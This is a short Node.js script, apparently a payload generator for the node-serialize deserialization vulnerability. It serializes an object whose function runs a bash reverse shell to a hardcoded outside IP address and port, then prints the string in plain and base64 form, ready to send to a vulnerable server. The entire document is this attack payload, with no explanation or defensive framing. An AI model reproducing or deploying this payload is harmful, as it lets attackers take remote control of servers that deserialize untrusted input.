const serialize = require('node-serialize');

const obj = {
    rce: function() {
        require('child_process').exec('bash -i >& /dev/tcp/119.28.14.52/6767 0>&1');
    }
}
const serializeStr = serialize.serialize(obj);
console.log(serializeStr);

console.log(Buffer.from(serializeStr).toString('base64'))
